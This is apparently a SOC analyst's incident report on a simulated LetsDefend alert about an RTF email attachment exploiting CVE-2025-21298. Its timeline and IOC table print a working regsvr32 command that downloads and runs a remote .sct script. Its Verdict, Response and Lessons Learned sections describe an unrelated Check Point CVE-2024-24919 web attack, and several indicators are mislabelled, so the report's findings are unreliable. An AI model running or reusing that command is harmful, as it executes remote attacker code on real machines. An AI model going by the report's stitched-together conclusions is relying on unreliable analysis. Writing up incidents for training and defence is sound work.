### [001] - [SOC336 - Windows OLE Zero-Click RCE Exploitation Detected]

**Date worked:** 2026-08-18<br>
**Source:** LetsDefend SOC Simulation / Home SOC Lab<br>
**Category:** Malware<br>
**Severity assigned:** Critical<br>
**CVE:** [CVE-2025-21298]<br>

---

**1. Alert Summary**
What triggered the alert? What did the SOC monitoring tool flag, and why did it warrant a look?
- The alert was triggered by a specific rule name: SOC336 - Windows OLE Zero-Click RCE Exploitation Detected.
- The SIEM monitoring tool flagged: A malicious RTF(Rich Text Format) attachment identified with known `CVE-2025-21298` exploit pattern.
- The SIEM warrants a look at: Source IP Address: `84.38.130.118`, Email Source Address: `projectmanagement@pm.me`, Device Action: `Allowed`.

<br>

**2. Initial Triage**
First actions taken. What did I check first, and why that, before anything else?
- Initially, I checked which destination `IP address/host` the source email address sent the mail to; the IP belonged to a user named Austin in the letsdefend domain. After a successful identification, I pinpointed the compromised endpoint and promptly isolated it from the network to prevent any potential damage or unauthorized access. Following this, I delved into the endpoint security section to gather comprehensive information about the device, including its operating system, installed applications, and any recent activities that could indicate further security concerns. By quarantining the device, I aimed to safeguard the entire network from any additional attacks and mitigate the risk of lateral movement, which could allow threats to spread to other connected systems.

<br>

**3. Investigation Timeline**

| Time | Action | Result |
|---|---|---|
| 12:10 | Reviewed CVE linked to the rule | CVE-2025-21298 |
| 12:15 | Reviewed Email Security on the source endpoint | Found a matching email from the source IP, with the time it was sent and an attachment: `mail.rtf`. |
| 12:22 | Reviewed log management logs | Found that the destination IP address `172.16.17.137` made a **GET** request to the source IP address `84.38.130.118` via *proxy*. |
| 12:30 | Reviewed log management logs | Found raw data: Process: `cmd.exe`, Process ID: `6784`, Request URL: *http://84.38.130.118.com/shell.sct*. |
| 12:32 | Reviewed endpoint process activity | Identified the Process ID along with its image path, parent path, desktop user, and target command line. |
| 12:40 | Reviewed endpoint network connections | Found and confirmed the Source IP address that made the connection. |
| 12:45 | Reviewed endpoint terminal history | Identified the command line as well. |
| 12:48 | Reviewed endpoint Broswer history | Found no matching data. |
| 12:48 | Quickly reviewed the MITRE ATT&CK linked to the rule | T1566, T1059.001, T1574.002 |

<br>

**4. Investigation**
Step-by-step walkthrough of the analysis:
- Logs/tools reviewed:
   - Log Management Tool: To confirm the connection pattern and frequency.
   - Endpoint Security (EDR): To check which process on the host initiated the connection.
   - Endpoint Security (EDR): To collect data from the network action, terminal history, and browser history plugins on the host that initiated the connection.
   - DNS logs: To see if the destination IP was reached via a domain lookup or a hardcoded IP.
   - VirusTotal: Checked the reputation of the source IP, associated domain, and the malicious attachment.
- Indicators found:
   - The source IP address `84.38.130.118` on port `80`, along with the email address `projectmanagement@pm.me`, sent an email to the destination IP address mentioned above. The email contained more than 20 words and included a malicious attachment that claimed to be from the project management team.
   - The EDR(Endpoint detection response) provided crucial information that was identified as **vital** for analysis, along with the specific time and date when this data was flagged. This information is essential for understanding the context and circumstances surrounding the event:
       - Feb 04 2025 08:06:42 - Source IP: `84.38.130.118`
       - Feb 04 2025 08:06:08 - `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
   - A matching DNS query was submitted linking to the source IP: `projectmanagement@pm.me`.
   - VirusTotal flagged the IP as malicious (10/91 vendors), associated with SIA RixHost.
   - VirusTotal flagged the attachment as malicious (10/92 vendors), categorized as Phishing and Other Frauds, associated with a domain download.cyberlearn.academy.

- Any pivoting done:
  - I searched log management for 84.38.130.118 across all other internal hosts; no additional targets found, indicating this was a single-target attempt.
  - I checked whether **projectmanagement@pm.me** sent or delivered the same email and attachment to other endpoints in the environment, but found nothing.
  - I found out the source IP address belongs to SAR195-RIPE and originates from Europe.
  - I found the Source IP is registered to a Network Named **DATACLUB-LV**

<br>
    
**5. IOCs (Indicators of Compromise)**

| Type | Value | Notes |
|---|---|---|
| IP | `84.38.130.118` | The IP address that sent the email. |
| Domain | `projectmanagement@pm.me` | The subdomain from which the email originated. |
| URL | `http://84.38.130.118.com/shell.sct` | It passes a target URL to the installation function. Instead of pointing to a local file, it forces regsvr32 to reach out over the network/internet to download a remote Windows Script Component (.sct) file. |
| Command line | `C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll` | Launches the native Windows Command Prompt to execute the subsequent string asynchronously and then terminate immediately.|
| Attachment | `mail.rtf` | A malicious attachment found in the mail received by Austin |

<br>

**6. MITRE ATT&CK Mapping**

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Phishing | T1566 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
|  Stealth, Execution | Hijack Execution Flow | T1574.002 |

<br>

**7. Evidence**
Screenshots, log snippets, or IOC tables that support the findings.

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/Monitoring%20Review%202.png)

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/Log%20Management%20Review%202.png)

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/EDR%20Review%202.png)

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/Virustotal-2%20Review.png)

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/Virustotal-2%20Attachement%20Review..png)

<br>

**8. Verdict**
True Positive: 
  - A recent web attack was successful, revealing critical vulnerabilities in the security infrastructure. Upon analyzing the tools used for log review and information gathering, it was determined that the firewall permitted a POST request. This oversight enabled the attacker to access private information within the network device.

  - ![](https://raw.githubusercontent.com/Tmitchy/-SOC-Incident-Documentation/main/images/Verdict%20Review2.png)

<br>

**9. Response / Containment**

What action was taken (or would be taken in a live environment):
- Confirmed host isolation (`CP-Spark-Gateway-01`) as the correct containment step, given the confirmed unauthorized file access and Check Point CVE match.
- Escalated to Tier 2 for further investigation into the extent of the file read and any downstream impact.

<br>

**10. Lessons Learned**
What this incident taught me: 
  - What **aCSHELL** is: a string used by attackers to trick the Check Point web server's routing logic.
  - Through further research, I gained a better understanding of how this vulnerability was exploited, particularly by recognizing how web attacks work by modifying parameters, such as the directory traversal payload.
  - How CVE-2024-24919 specifically bypasses authentication.

---

[← Back to index](../README.md)
